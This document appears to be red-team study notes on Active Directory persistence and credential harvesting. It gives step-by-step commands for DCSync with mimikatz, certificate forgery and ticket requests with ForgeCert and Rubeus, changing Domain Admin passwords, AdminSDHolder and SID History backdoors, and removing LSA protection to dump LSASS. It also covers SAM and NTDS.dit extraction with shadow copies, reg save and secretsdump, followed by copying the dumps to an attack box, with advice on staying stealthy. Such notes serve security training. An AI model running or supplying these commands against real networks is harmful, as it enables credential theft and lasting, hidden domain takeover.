### Ticket Forgery Detection & Prevention

**Unified Defense Strategy:**

1. **Credential Protection:**
   - Rotate krbtgt password twice every 180 days (or after compromise)
   - Enable AES encryption for Kerberos (disable RC4/DES)
   - Use managed service accounts to auto-rotate passwords

2. **Monitoring & Alerting:**
   - Event ID 4768: TGT requests (Golden Ticket indicators)
   - Event ID 4769: TGS requests (Silver Ticket indicators)
   - Event ID 4627: Group membership enumeration
   - Abnormal ticket lifetimes, encryption types, source IPs

3. **Access Controls:**
   - Limit DCSync permissions to Domain Controllers only
   - Restrict LSASS memory access (Credential Guard)
   - Implement Privileged Access Workstations (PAWs)

4. **Network Segmentation:**
   - Isolate Domain Controllers on dedicated network segments
   - Monitor/restrict Kerberos traffic (ports 88, 464)
   - Deploy honeypot accounts to detect credential theft

---

## MODULE 6: PERSISTING ACTIVE DIRECTORY

**Active Directory Persistence Mechanisms Comparison:**


*Figure: Comprehensive comparison of AD persistence mechanisms with stealth, reliability, and detection considerations*

---

### NOTES

How is it possible for you to authenticate using some credentials (password, password Hash) in two different DC?

---

### DOMAIN REPLICATION

Each Domain Controller runs a process called **KNOWLEDGE CONSISTENCY CHECKER (KCC)** which generates a replication topology for the AD forest & automatically connects to other Domain Controllers through **Remote Procedure Calls (RPC)** to synchronize Information known as DC Synchronization.

It's not just the DC that can Initiate Replication, it's also done through Accounts belonging to **Domain Admin Group**.

---

### DC Sync Attack

**DC Sync Attack** → Get an Account with Domain Replication Permissions, stage DC Sync Attack → Harvest Credentials.

The Goal is to persist at near-privileged Credentials; Ensuring we have enough keys to Achieve goal execution.

As such, attempt to persist through Credentials:

1. Credentials that have Local Administrator Rights to Several Machines
2. Service Accounts that have delegation Permissions, likewise Service Accounts of Privileged Services
3. Using mimikatz.exe to dump/harvest Credentials:

```
lsadump::dcsync /domain:<domain> /user:<user or all>
```

Ensure to setup/enable logging in mimikatz:
```
log <filename.txt>
```

By overwhelming our Command Shell with output - use `all` option.

Download to your AttackBox the dumped Credential logs with `scp` (SSH File Copy Protocol).

Using `cat` & `grep` Piped together:
```bash
cat <dcsync.txt> | grep "SAM Username" or "Hash NTLM"
```

---

### Persisting through Credentials (1.0)

**Password/Hash**

---

### Persisting through Tickets (2.0)

**Kerberos Pointers / HINTS:**

The **TGT** is signed with the **KRBTGT** service Account Password Hash - Symmetrical (KDC-AUTH-S) Symmetrical.

The **TGS** (obtained from KDC-TGS-S) is encrypted with the NTLM hash of the Service that the User is requesting access for (Application Server).

Client presents this TGS to the Service in question for access, which can easily verify the TGS Since it knows its own hash & can grant the user access.

TGT is only used to prove that the KDC (a DC) Signed it Since it was signed with the `krbtgt` password hash.

---

### Certificate Templates

```bash
certutil -CaTemplates
certutil -v -template "<TemplateName>"
```

---

## ACTIVE DIRECTORY CERTIFICATE TEMPLATES

**Date: 26/02/25**

### MICROSOFT'S Public Key Infrastructure Implementation

### NOTES

Active Directory provides a level of Trust in an Organization. It can be used as a Certificate Authority to prove & delegate trust.

**What makes AD CS an even more dangerous Attack Vector?**

Certificates Can Survive Credential Rotation; meaning even if a Compromised Account's Password is Reset, it does nothing to invalidate Maliciously generated Certificates.

---

### Certificate Request Flow

```
1. Client (user/PC) generates key pair
                ↓
2. Client sends a Certificate Request
   Certificate Signing Request (CSR)
   - CSR Template
   - Subject
   - EKU
   - Public key
                ↓
3. CA (DC) checks if CERT Template exists
   Checks if Settings in CSR is allowed
   Checks if user is allowed to enroll
                ↓
4. CA generates a Certificate
   Signs it using CA's private key
                ↓
5. Client STORES CERT
   - Certificate
   - Public Key
   - CA Signature
   - Subject
   - EKU
```

---

### ENTERPRISE CA VERSUS STANDALONE CA

**CA Integrated with Active Directory**

Certificate Templates (Created by Enterprise Admins) allows any user with the Relevant permissions to request a Certificate themselves.

These templates have parameters that specify which user can request the Certificate & what is required, abstracting the Herculean Task of Centrally Creating, Managing & Distributing each Certificate Manually.

However, Combination of these parameters can be loose and Abused.

---

### Enumerating Certificate Templates to identify Vulnerable Ones

**Understand and Exploitation Requirements:**

Windows Built-in **CERTUTIL** can be used to enumerate Templates and their associated policies.

---

### A. Exploitable Template Parameters

Enumerate Certificate Template where our user has either:
- **ALLOW ENROLL**
- **ALLOW FULL CONTROL**

Where **ALLOW ENROLL** permits user to Request Certificates & **ALLOW FULL CONTROL** permits user to modify Templates.

Certificate Template permissions in most cases assigned to AD Groups & not directly to AD users.

- **Domain Users** - In most cases, means that any authenticated Users Can Request the Certificate
- **Domain Computers** - Means that the machine account of a domain-Joined machine/Host can request Certificate

---

### OBJECT IDENTIFIERS (OIDs)

**B. EKU - Client Authentication:**

This Extended Key Usage means the Certificate Can be used for Kerberos Authentication.

---

### C. Test Templates Allows Client to Specify SAN

**Subject Alternative Name** during request; to find these we can further Enumerate & grep Certificate Templates for `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` property flag set to 1 Indicating that we can specify the SAN.

This allows us to Impersonate anyone.

---

### D. No Authorized Signatures & Manager Approval Disabled

Limit human Intervention during approval.

---

### Certificate Enrollment

Run **Microsoft Management Console (mmc)**:
- CLICK ADD/Remove SNAP-IN
- ADD CERTIFICATE SNAP-IN (allows you to browse the contents of Certificate stores for yourself, a service, or computer)
- FILE → Export Private key → ENROLL CERT + Impersonate SAN as UPN

---

## User Impersonation Through a Certificate

**Date: 25/02/25**

### NOTES

**Covered:** Using the forged Certificate to request a Kerberos TGT which Can then be loaded Into any hacking platform of choice like Metasploit, Cobalt Strike, Covenant.

---

### Rubeus asktgt

```cmd
Rubeus.exe asktgt /user:<user> /enctype:<aes256> /certificate:<path> /password:<cert password> /outfile:<tgt.kirbi> /domain:<FQDN> /dc:<IP>
```

**Parameters:**
- `/user:` - Specifies the user that we will Impersonate & has to match the UPN for the Certificate we generated
- `/enctype:` - Specifies the encryption type for the ticket
- `/outfile:` - The file where our TGT will be output to (use `.kirbi` file extension)
- `/certificate:` - Directory path to the Certificate we generated
- `/password:` - The password used for the Certificate file
- `/dc:` - The IP of the domain Controller we are requesting the TGT from. Select an Enterprise DC (AD Integrated CA)
- `/domain:` - The FQDN of the particular domain (or sub) in the AD forest We are Currently Attacking

---

### Option 1

Export the TGT to our Attack box & Use Metasploit, Cobalt Strike, Covenant to gain access elevated.

---

### Option 2

We can Use Rubeus to use the TGT ticket to alter the password of any of the Domain Administrators.

```cmd
Rubeus.exe changepw /ticket:<file> /new:<new password> /dc:<Target DC IP> /targetuser:<Administrator>
```

Option 2 allows us to use the DA's Credential to log Into the Domain Controller as Administrator.

Now, We can authenticate as the Administrator to the DC, also We can use RUNAS command to authenticate as another DA.

---

### Persistence through Certificates

**Credential AGNOSTIC** - Rotation of credentials will not kick us out.

We need a valid Certificate that can be used for Client Authentication; allows us to Request a TGT; allows for Continuous TGT requests.

Let's go after the Certificate Authority:
The private key of the CA is stored on the CA Server itself.

**CA Private key** often protected by:
- Hardware Security Module (HSM)
- Machine Data Protection API (DPAPI)

Use Tools like **Mimikatz** & **SharpDPAPI** to extract the CA Certificate & thus the private key from the CA.

---

### Mimikatz Syntax to view Certificates:

```
mimikatz # privilege::debug
mimikatz # crypto::certificates /systemstore:local_machine
```

**Syntax to patch memory:**

```
mimikatz # crypto::capi
mimikatz # crypto::cng
```

**Export:**

```
mimikatz # crypto::certificates /systemstore:local_machine /export
```

The exported Certificates will be stored in `.pfx` & `.DER` format to Disk.

In order to export the private key, a password must be used to encrypt the Certificate; by default, mimikatz assigns the password: **mimikatz**

Download/Copy the Certificate (Password was mimikatz) to your Attack Box Using SCP.

---

### Certificate Extraction Steps

**Date: 27/02/25**

### NOTES

**Performing Domain Persistence via a Golden Ticket Requires the following steps:**

1. **Certificate Extraction**
2. **Forge CA Certificate**
3. **Obtain a Kerberos Ticket**
4. **Perform Pass-the-Ticket (PTT)**

---

### (1.0) CA Certificate & Private key stored on CA Server

Different ways to Extract CA Certificate & Private key:

**a)** RDP Into CA Server → Use Backup Functionality of **"CERTSRV.MSC"** → Certificate will be exported as P12 file

**b)** Use **Seatbelt.exe** with Parameter "Certificates" to enumerate the stored Certificates; As well as **Certutil.exe**

**c)** Use **Mimikatz** To Interact with the Crypto stores to retrieve & Export Certificates & Private key

**d)** **SharpDPAPI.exe** `Certificates /machine` → User machine Certificate store to extract decryptable Machine Certificates

---

### (2.0) Extracted Private key & Certificate written into ".pem" Extension

Use **openssl** to Convert it into ".pfx" extension.

---

### (3.0) Forge CA Certificate:

**a)** Use mimikatz `crypto::scauth` Module with `/caname:` `/upn:` `/pfx:` - define the filename

**b)** Use **ForgeCert.exe** → Forge a Certificate for any domain User Using the CA Certificate for Authentication

The tool can be executed from the memory of the Implant & will write a file into the disk.

---

### (4.0) Kerberos Ticket:

**a)** Use **Rubeus.exe** `asktgt` module to request the TGT from the Key Distribution Center (KDC) using forged Certificate for Authentication

**b)** Use **Mimikatz** `kerberos::golden` → With the `/ptt` option; The ticket is passed into the User's Current Session

---

### (5.0) Perform Pass-the-Ticket (PTT)

The Certificate belongs to the Machine Account of the Domain Controller (`krbtgt`) could be used from any host on the domain in order to request a Kerberos ticket.

**a)** Use Rubeus.exe `asktgt` `/user:` `/certificate:` `/password:` `/outfile:<tgt.kirbi>`

The ticket belongs to the machine Account of the domain controller, elevated activities could be performed such as **DCSync** - from the Current session executing Mimikatz.

Running the Command below will retrieve NTLM Hash:

```
lsadump::dcsync /user:Administrator
```

The Hash could be used to establish access on DC.

---

## (6.0) Persisting through Access Control Lists

**Date: 27/02/25**

### NOTES

**AD Group Templates**

Every Object

The **Admin SD Holder** Container exists in every AD domain, its Access Control List (ACL) is used as a template to copy permissions to all protected groups:
- Domain Admins
- Enterprise Admins
- Schema Administrators
- Backup Operators
- Certificate Publishers
- Print Operators
- Server Operators
- Krbtgt
- Replicator

---

### SD Propagator

A process called **SD Propagator (SDProp)** takes the ACL of the Admin SDHolder Object & applies it to all protected groups every 60 minutes (1hr).

We can write an **Access Control Entry (ACE)** that will grant us full permissions on all protected groups → quite frustrating for Blue Team.

Cause even if they remove our membership & Inappropriate permission on the protected object/group, we wait Until the Template refreshes (within an hour) we will once again be granted membership.

This reconstruction occurs via normal AD processes.

It wouldn't show any alert, making it harder to pinpoint the source of the persistence.

---

### STEPS TO PERSIST with Admin SD Holder:

1. Use **Microsoft Management Console (mmc)**
   - Add Users & Groups Snap-in
   - Active Directory Users & Computers

2. Ensure to enable advanced features:
   - View → Advanced Features

3. We find the AdminSDHolder group/object under:
   - Domain → System

4. Navigate to the Security of the group:
   - Properties → Security

5. ADD our low-privileged User & grant Full Control
   - Apply Changes

6. Now we wait 60 minutes

This is because the **"Security Descriptor Propagator (SDProp)"** Service executes automatically every 60 minutes and will propagate this ACL change to all protected Groups.

---

### Force the Propagation

```powershell
Invoke-ADSDPropagation
```

You can Verify that this will continue to propagate by removing your User from Security Permission & Rerunning PowerShell Script (`Invoke-ADSDPropagation`). Your user will be added again.

Although we have permissions to modify the group, it doesn't automatically add us to the group.

However using our permissions, we can manually add Ourselves to this group (protected group).

You Can also grant full control to the **Domain Users** in the Admin SDHolder, means any low privilege User would be granted full control over all protected Groups.

**Try Combining this with DC Sync.**

---

## (7.0) Persisting through SID History

**Date: 26/02/25**

### NOTES

```
OLD DC ─────────────────► New DC
(Previous SID migration)  (New SID)
     |
Previous SID ──► SID History Attribute
```

**Security Identifiers (SID)** are used to track the Security Principal Object & the account's access when connecting to Resources.

**SID History** is an Important attribute on each object legitimately used to enable access for an account to effectively be cloned to another.

Useful when an Organization is performing AD Migration, as it allows users to retain access to the Original domain while being Migrated to the new domain.

In the new domain, the User would have a new SID, but can add the User's Existing SID in the SID History.

---

### SID Attribute

**SID History** is not restricted to only Including SIDs from other Domains. Without any form of verification, We can just add a SID of our current domain to the SID-SID History of an account in our Control.

**Requires Admin privileges or equivalent thereof to perform the attack.**

When the account creates a Logon Event, the SIDs associated with the account are added to the User's token, which then determines the privileges associated with the account. Includes group SIDs.

We Can't Take this attack a step further, If we inject the **Enterprise Admin SID** Since this would elevate the account's privilege to effectively be Domain Admins in all domains in the forest.

Since the SIDs are added to the User's token, privileges would be respected even if the User Account is not a member of the actual group (Enterprise Admin) - A Sneaky method of persistence.

**SID History Attack Visualization:**

```mermaid
graph TD
    subgraph Normal["Normal User Logon"]
        U1[User: JohnDoe<br/>SID: S-1-5-21-XXX-1001]
        U1 --> T1[Access Token]
        T1 --> T1a[User SID: S-1-5-21-XXX-1001]
        T1 --> T1b[Group SIDs:<br/>Domain Users<br/>Authenticated Users]
        T1 --> T1c[Privileges: Limited]
    end
    
    subgraph Attack["SID History Attack"]
        A1[Attacker compromises<br/>Domain Admin]
        A1 --> A2[Add Enterprise Admin SID<br/>to JohnDoe's SID History]
        
        A2 --> A3[mimikatz or PowerShell:<br/>Add-ADDBSidHistory]
        
        A3 --> A4[JohnDoe's account modified]
        A4 --> A5[SID: S-1-5-21-XXX-1001<br/>SID History:<br/>S-1-5-21-XXX-519 Enterprise Admin]
    end
    
    subgraph Persistence["Persistent Elevated Access"]
        A5 --> L1[JohnDoe logs in]
        L1 --> T2[Access Token Created]
        T2 --> T2a[User SID: S-1-5-21-XXX-1001]
        T2 --> T2b[SID History:<br/>S-1-5-21-XXX-519 Enterprise Admin]
        T2 --> T2c[Group SIDs: includes Enterprise Admin]
        T2 --> T2d[Privileges: Domain Admin level]
        
        T2d --> Result[JohnDoe has Enterprise Admin<br/>rights WITHOUT being member<br/>of Enterprise Admins group]
    end
    
    Result -.Stealth: Group membership<br/>appears normal.-> Result
    Result -.Works across forest trusts.-> Result
    
    style Normal fill:#e6f3ff
    style Attack fill:#ffe6e6
    style Persistence fill:#ffcccc
    style Result fill:#ff9999
```

*Figure: SID History attack injects privileged SIDs into user tokens, granting elevated access without group membership*

---

### Increasing Stealth

We Can up the Sneakiness to another level by making sure to always use this normal user account to alter the SID history of another account.

The Initial persistence vector is not as easily discovered/remedied.

---

### STEPS TO FORGING HISTORY

1. Use **AD-RSAT PowerShell cmdlets** to Enumerate User & Privileged groups → Enumerate SID History:

   ```powershell
   Get-ADUser <Username> -Properties sidhistory, memberof
   Get-ADGroup "Enterprise Admins"
   ```

2. Use **mimikatz** to patch LSASS to update SID History
   
   OR
   
   Use **SysInternals Tools** to patch `ntds.dit` file

**NB:** The `ntds.dit` database is locked when `ntds` Service is running, to patch SID history first stop the service & then Restart it:

```powershell
Stop-Service -Name ntds -Force
Start-Service -Name ntds
```

3. Add SID History:

   ```powershell
   Add-ADDBSidHistory -SamAccountName "<Username of low priv User>" -SidHistory "<SID to add to history>" -DatabasePath <path>
   ```

**NB:** for Stealth purposes, Use AD-RSAT PowerShell Tools to remove SID History afterwards: `Remove-ADDBSidHistory`

---

### Limitation

While SID History is a great persistence Technique, Credential Rotation/clean up will remove our Persistence.

In Certain Cases, it may be best to perform Persistence by targeting AD Groups themselves.

---

## MODULE 7: CREDENTIAL HARVESTING

**Date: 27/02/25**

### NOTES

**Credential Harvesting** Consists of Techniques for obtaining Credential Information like:
- Login Info
- Account Name
- Password
- Private key
- NTLM Hash
- TGT/TGS

A technique of extracting Credential Information from a system in various locations:
- Registry
- Memory Dump
- Database Files
- Password Managers
- Active Directory
- Network Sniffing

Gaining access to legitimate Credentials has benefits for Lateral movement; for stealth & Undercover purposes - hard to detect.

External Credential Harvesting most likely Involves **PHISHING** Techniques, we will be discussing **INTERNAL** Credential Harvesting.

---

### CREDENTIAL ACCESS

Where adversaries find Credentials in Compromised Systems & gain access to CREDENTIALS for Lateral Movement.

Helps adversaries to Reuse them or Impersonate the identity of a User → Important step for Lateral Movement and accessing other Resources like Applications & Hosts.

Obtaining Legitimate User Credentials is preferred to exploiting system using CVE.

Credentials are stored securely in various locations in systems; listed as follows:
- Clear-Text files
- Database files
- Process Memory
- Password Managers
- Active Directory
- Network Sniffing

---

## Clear-Text Files

Adversaries may search a Compromised machine for Credentials in Local/Remote file systems; defined as **Unsecured Credentials**.

Such files Created by Users to store their own Credentials & stored Credential stores for a group of Individuals.

Config files Containing Passwords, Source Code/Library files Containing embedded passwords/API keys.

In Cloud/Containerized environments, authenticated User's Service account Credentials are often stored in Local Config files / even as parameters to Commands in Container logs.

Other Locations Include:
- Command-shell History
- Registry

**PowerShell Console History:**

```cmd
C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Registry Queries:**

```cmd
C:\Users\<Username>> reg query HKLM /f password /t REG_SZ /s
C:\Users\<Username>> reg query HKCU /f password /t REG_SZ /s
```

---

### Registry Hives

- **HKLM** - Registry Hive Key Local Machine
- **HKCR** - Registry Hive Classes Root (a subset of HKLM & HKCU)
- **HKCU** - Registry Hive Current User (Subkey of HKU)
- **HKCC** - Registry Hive Key Current Config

---

## LSASS.EXE

**Date: 28/02/25**

### NOTES

**PROTECTED LSASS:** Microsoft Implemented LSA protection to keep LSASS from being accessed to extract Credentials.

To enable LSA protection, modify the Registry **RUNASPPL DWORD Value** in:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
```

If LSA protection is enabled, running:

```
mimikatz # sekurlsa::logonpasswords
```

Results in an **ERROR**, the Command returns a `0x00000005` (DWORD) error Code message (Access Denied). Same with any other method.

---

### Bypass LSA Protection

Luckily for us, mimikatz provides a **mimidrv.sys** driver that works on kernel level to disable the LSA protection.

We can Import it to Mimikatz by executing `!+`:

```
mimikatz # !+
```

**NB:** If this fails with an error **"isFileExist"**, exit mimikatz, Run it again.

Once the `mimidrv.sys` driver is loaded, we can disable the LSA protection:

```
!processprotect /process:lsass.exe /remove
```

Run `sekurlsa::logonpasswords` command again, executed successfully, shows cached Credentials in memory.

---

## (8.0) CREDENTIAL MANAGER

A Windows Feature that stores sensitive Logon Info for Websites, Applications, Networks.

It contains login Credentials:
- Web Credentials
- Generic Credentials
- Windows Credentials
- Certificate-Based

No Authentication details are stored on the User's folder & are not shared among Windows User accounts, however they are cached in memory.

We can access the Windows Credential Manager through:

**GUI:**
- Control Panel → User Accounts → Credential Manager

**Command Line - Tool [VAULTCMD]** utility enables us to enumerate stored Credentials:

```cmd
VaultCmd /list
```

To Specify which Credential vault to access:

```cmd
VaultCmd /listcreds:"Web Credentials"
```

---

### Dumping Credentials

The `vaultcmd` is unable to show passwords, but we can rely on other PowerShell scripts:

```powershell
powershell -ex bypass
Import-Module C:\<filepath>\Get-WebCredentials.ps1
Get-WebCredentials
```

Output contains Username & password.

---

### (9.0) An Alternative Method

Using **RUNAS** command via a tool that allows running Windows Applications or tools Under a different User's permissions.

The `/savecred` argument allows you to save the Credentials of the user in Windows Credential Manager (Under the Windows Credentials vault), so the next time we execute as the same user, no need for password.

---

### Enumerate Stored Credentials

Using **cmdkey** - a tool to create, delete, & display stored local windows Credentials:

```cmd
cmdkey /list
```

We use RUNAS to execute a Windows App (`cmd.exe`) as one of the enumerated Saved Credentials found:

```cmd
runas /savecred /user:<username@domain> cmd.exe
```

A new Command prompt pops up. `whoami` to confirm.

---

### (10.0) Mimikatz

```
mimikatz # sekurlsa::credman
```

Dumps clear-text passwords stored in Credential Manager.

Mimikatz also has `vault` module to enumerate Windows Credential Manager like GUI/Vaultcmd/cmdkey.

---

## KEYLOGGING

**Date: 28/02/25**

### NOTES

As a red teamer hunting for credentials through keyloggers is always a good option when we know a Compromised target Host has a logged-in user.

We can perform keylogging using tools:
1. Metasploit
2. Others

---

## SECURITY ACCOUNT MANAGER (SAM)

**Date: 28/02/25**
## SECURITY ACCOUNT MANAGER (SAM) DATABASE EXTRACTION

**Date: 28/02/25**

```
C:\Windows\system32\config\SAM.db
```

### NOTES

**Security Account Manager (SAM)** is a Windows database containing local account information including usernames and password hashes. The SAM database stores these details in encrypted format and cannot be accessed while the operating system is running through normal means.

**SAM vs LSASS (Key Differences):**
- **SAM:** Stores local account password hashes on disk (persistent, static storage)
- **LSASS:** Caches domain credentials in process memory (volatile, runtime storage)
- **SAM:** Contains only local machine accounts
- **LSASS:** Contains both local and domain-authenticated user credentials

**Encryption:** SAM database is encrypted using the **SYSTEM** registry hive as the decryption key. Both SAM and SYSTEM files must be obtained to decrypt password hashes.

**SAM Extraction Methods Decision Tree:**

```mermaid
graph TD
    Start{Extract SAM Database<br/>Password Hashes}
    
    Start -->|Have Meterpreter?| Q1{Meterpreter Session?}
    Q1 -->|Yes| M1[Metasploit: hashdump]
    Q1 -->|No| Q2{Admin CMD Access?}
    
    Q2 -->|Yes| Q3{Prefer GUI/Stealth?}
    Q3 -->|VSS| M2[Volume Shadow Copy]
    Q3 -->|Registry| M3[Registry Hive Export]
    
    Q2 -->|Have Mimikatz| M4[Mimikatz LSADUMP::SAM]
    
    M1 --> M1_1[run hashdump]
    M1_1 --> R1[✓ Fast<br/>✓ Automated<br/>✗ High detection<br/>✗ Requires Meterpreter]
    
    M2 --> M2_1[wmic shadowcopy create]
    M2_1 --> M2_2[copy SAM from shadow]
    M2_2 --> M2_3[copy SYSTEM from shadow]
    M2_3 --> M2_4[secretsdump.py offline]
    M2_4 --> R2[✓ Extracts locked files<br/>✓ Gets SECURITY hive<br/>✗ Leaves event logs<br/>✗ Medium detection]
    
    M3 --> M3_1[reg save HKLM\SAM]
    M3_1 --> M3_2[reg save HKLM\SYSTEM]
    M3_2 --> M3_3[secretsdump.py offline]
    M3_3 --> R3[✓ Simple command<br/>✓ Small files<br/>✗ Registry access logs<br/>✗ Medium detection]
    
    M4 --> M4_1[privilege::debug]
    M4_1 --> M4_2[lsadump::sam]
    M4_2 --> R4[✓ Real-time results<br/>✓ No file transfer<br/>✗ Very high detection<br/>✗ Requires Mimikatz binary]
    
    R1 & R2 & R3 & R4 --> Final[SAM Hashes Obtained]
    
    style M1 fill:#ff9999
    style M2 fill:#99ccff
    style M3 fill:#99ff99
    style M4 fill:#ffcc99
    style Final fill:#ffffcc
```

*Figure: Four methods for SAM database extraction with trade-offs between ease of use and detection risk*

---

### SAM Extraction Methods

Multiple techniques exist to extract SAM database contents, each requiring Administrator privileges.

---

### Method 1: Metasploit Hashdump Module

**Requirements:** Meterpreter session with SYSTEM or Administrator token

Uses in-memory assembly code injection into the `LSASS.EXE` process to dump a copy of password hashes directly from memory.

**Prerequisite:** Active Meterpreter session (via exploit or payload)

**Step 1: Verify Privileges**
```
meterpreter > getuid
```

Output should show: `Server username: NT AUTHORITY\SYSTEM` or local Administrator

**Step 2: Dump SAM Hashes**
```
meterpreter > run hashdump
```

**Output Format:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User1:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

**Hash Format:** `Username:RID:LM-Hash:NTLM-Hash:::`

**Advantages:**
- Fast and automated
- No file extraction required
- Works directly from memory

**Disadvantages:**
- Requires active Meterpreter session
- Only extracts local account hashes (no domain accounts)
- Detected by AV/EDR solutions

**Note:** Domain account credentials are not stored in the local SAM database. To extract domain account hashes, see the LSASS memory extraction or NTDS.dit methods.

---

### Method 2: Volume Shadow Copy Service (VSS)

**Requirements:** Administrator privileges, Volume Shadow Copy Service enabled

This technique uses **Microsoft Volume Shadow Copy Services** to create a snapshot of the C:\\ drive, allowing extraction of locked files (SAM, SYSTEM, SECURITY) while the OS is running.

**Volume Shadow Copy Service (VSS):**
- Coordinates backup operations between applications and storage
- Creates point-in-time snapshots (shadow copies) of volumes
- Enables backup of in-use/locked files

**Step 1: Open Administrator Command Prompt**

Run `cmd.exe` with elevated privileges

**Step 2: Create Shadow Copy**
```cmd
wmic shadowcopy call create volume='C:\\'
```

Output: `ReturnValue = 0` (success)

**Step 3: Verify Shadow Copy Creation**
```cmd
vssadmin list shadows
```

Output shows shadow copy details including **Shadow Copy Volume** path:
```
Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1
```

**Step 4: Extract SAM Database**
```cmd
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\SAM C:\\Users\\Administrator\\SAM
```

**Step 5: Extract SYSTEM Registry Hive (Decryption Key)**
```cmd
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\SYSTEM C:\\Users\\Administrator\\SYSTEM
```

**Step 6: Extract SECURITY Hive (Optional - for domain cached credentials)**
```cmd
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\SECURITY C:\\Users\\Administrator\\SECURITY
```

**Step 7: Transfer Files to Attacker Machine**
```bash
scp Administrator@<target-ip>:C:\\Users\\Administrator\\SAM .
scp Administrator@<target-ip>:C:\\Users\\Administrator\\SYSTEM .
```

**Step 8: Extract Hashes Offline (Impacket secretsdump.py)**
```bash
python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
```

**Output:**
```
[*] Target system bootKey: 0x12345678901234567890123456789012
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Advantages:**
- Extracts files while OS is running
- No process injection required
- Can extract SECURITY hive for cached domain credentials

**Disadvantages:**
- Requires VSS to be enabled
- Generates Windows Event Logs (Event ID 8222, 8224)
- Leaves shadow copy artifacts (must be cleaned)

**Cleanup (Remove Shadow Copy):**
```cmd
vssadmin delete shadows /for=C:\\ /all
```

**Detection Risk:** Medium (Event ID 8222, unusual shadow copy creation)

---

### NTDS.dit Extraction Methods Decision Tree

**NTDS.dit** is the Active Directory database file containing all domain credentials, stored on Domain Controllers at `C:\Windows\NTDS\ntds.dit`.

```mermaid
graph TD
    Start{Need NTDS.dit<br/>Domain Controller Database}
    
    Start --> Q1{Access Level?}
    
    Q1 -->|Local DC Admin| Local[Local Extraction Methods]
    Q1 -->|Remote DC Access| Remote[Remote Extraction Methods]
    Q1 -->|No DC Access| NoAccess[DCSync Alternative]
    
    Local --> L1{Preferred Method?}
    L1 -->|Offline| VSS[Volume Shadow Copy]
    L1 -->|Live| NTDSUtil[NTDSUtil IFM]
    L1 -->|Memory| Mimikatz[Mimikatz LSA Dump]
    
    VSS --> VSS1["1. wmic shadowcopy create"]
    VSS1 --> VSS2["2. Copy ntds.dit from shadow"]
    VSS2 --> VSS3["3. Copy SYSTEM hive"]
    VSS3 --> VSS4["4. secretsdump.py offline"]
    VSS4 --> VSS_Result["✓ All domain hashes<br/>✓ Works while DC running<br/>✗ Event ID 8222<br/>✗ Requires local admin"]
    
    NTDSUtil --> NU1["1. ntdsutil 'activate instance ntds'"]
    NU1 --> NU2["2. 'ifm' create full export"]
    NU2 --> NU3["3. Export includes ntds.dit + SYSTEM"]
    NU3 --> NU4["4. Transfer & extract offline"]
    NU4 --> NU_Result["✓ Official Microsoft tool<br/>✓ Clean export<br/>✗ Service interruption<br/>✗ Large file size"]
    
    Mimikatz --> M1["1. privilege::debug"]
    M1 --> M2["2. lsadump::lsa /inject"]
    M2 --> M3["3. Real-time hash extraction"]
    M3 --> M_Result["✓ No file transfer<br/>✓ Fast extraction<br/>✗ Very high detection<br/>✗ Requires Mimikatz on DC"]
    
    Remote --> R1{Have Credentials?}
    R1 -->|Yes| DCSync_Method[DCSync Attack]
    R1 -->|No| R2[Gain credentials first]
    
    DCSync_Method --> DC1["mimikatz or secretsdump.py"]
    DC1 --> DC2["Replication permissions:<br/>DS-Replication-Get-Changes<br/>DS-Replication-Get-Changes-All"]
    DC2 --> DC3["Request replication data<br/>via DRS protocol"]
    DC3 --> DC_Result["✓ No DC file access needed<br/>✓ Network-based<br/>✗ Requires replication rights<br/>✗ Event ID 4662"]
    
    NoAccess --> NA1["Kerberoasting or<br/>AS-REP Roasting first"]
    NA1 --> NA2["Escalate to<br/>replication rights"]
    NA2 --> DCSync_Method
    
    VSS_Result & NU_Result & M_Result & DC_Result --> Final[Domain Hashes Obtained]
    
    style VSS fill:#99ccff
    style NTDSUtil fill:#99ff99
    style Mimikatz fill:#ff9999
    style DCSync_Method fill:#ffcc99
    style Final fill:#ffffcc
```

*Figure: NTDS.dit extraction methods with local, remote, and alternative approaches including detection trade-offs*

---

### Method 3: Registry Hive Export

**Requirements:** Administrator privileges

Windows Registry stores a copy of SAM database contents in memory for use by Windows services. The **reg.exe** utility can export these registry hives to disk files.

**Step 1: Open Administrator Command Prompt**

**Step 2: Export SAM Registry Hive**
```cmd
reg save HKLM\\SAM C:\\Users\\Administrator\\Downloads\\SAM-reg
```

Output: `The operation completed successfully.`

**Step 3: Export SYSTEM Registry Hive**
```cmd
reg save HKLM\\SYSTEM C:\\Users\\Administrator\\Downloads\\SYSTEM-reg
```

**Step 4: Export SECURITY Hive (Optional)**
```cmd
reg save HKLM\\SECURITY C:\\Users\\Administrator\\Downloads\\SECURITY-reg
```

**Step 5: Transfer to Attacker Machine**
```bash
scp Administrator@<target-ip>:C:\\Users\\Administrator\\Downloads\\SAM-reg .
scp Administrator@<target-ip>:C:\\Users\\Administrator\\Downloads\\SYSTEM-reg .
```

**Step 6: Extract Hashes with Impacket**
```bash
python3 /opt/impacket/examples/secretsdump.py -sam SAM-reg -system SYSTEM-reg LOCAL
```

**Impacket secretsdump.py Parameters:**
- `-sam` - Path to exported SAM registry hive
- `-system` - Path to exported SYSTEM registry hive (contains decryption key)
- `-security` - Path to SECURITY hive (for cached domain credentials)
- `LOCAL` - Indicates local file analysis (vs remote extraction)

**Advantages:**
- Simple and reliable
- Uses built-in Windows tool
- Small file sizes

